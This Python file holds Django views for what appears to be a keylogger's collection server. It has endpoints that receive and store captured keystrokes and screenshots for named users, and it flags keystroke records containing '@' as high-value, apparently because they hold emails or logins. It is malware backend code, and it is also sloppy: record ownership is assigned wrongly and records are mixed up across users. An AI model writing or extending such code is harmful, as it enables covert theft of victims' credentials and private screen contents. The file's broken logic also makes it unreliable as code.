from django.shortcuts import render
from django.http.response import HttpResponse, HttpResponseBadRequest
from django.contrib.auth.models import User
from django.views.decorators.csrf import csrf_exempt
from .models import KeyLogRecord, Screenshot
import datetime

# Create your views here.

# TODO: WE COULD CORRECT SOMETHING HERE SINCE CHECKING USER IS A PART OF WEBSITE IS MORE FUNDAMENTAL

def keylog(request, username):
    if request.POST['mode'] == 'start':
        print('Starting a new Transaction')

        user = User.objects.filter(username=username)

        if user.exists():
            record = KeyLogRecord(string=request.POST['string'],
                                  start=datetime.datetime.now(),
                                  end=datetime.datetime.now(),
                                  starred=False)
            record.save()
            record.user = user
            return HttpResponse('Success')

        else:
            return HttpResponseBadRequest('User Does Not Exist')

    elif request.POST['mode'] == 'continue':
        print('Continuing a new Transaction')

        user = User.objects.filter(username=username)

        if user.exists():
            record = KeyLogRecord.objects.latest('start')
            record.string += request.POST['string']
            record.end = datetime.datetime.now()

            if '@' in record.string:
                record.quality = 'green'

            record.save()

            return HttpResponse('Success Continuing')

        else:
            return HttpResponseBadRequest('User Does Not Exist')


def screenshot(request, username):
    user = User.objects.filter(username=username)

    if user.exists():
        shot = Screenshot(img_string=request.POST['img_string'])
        shot.save()

        shot.user = request.user
        shot.save()

        return HttpResponse('Success Adding the Screenshot')

    else:
        return HttpResponseBadRequest('User Does Not Exist')
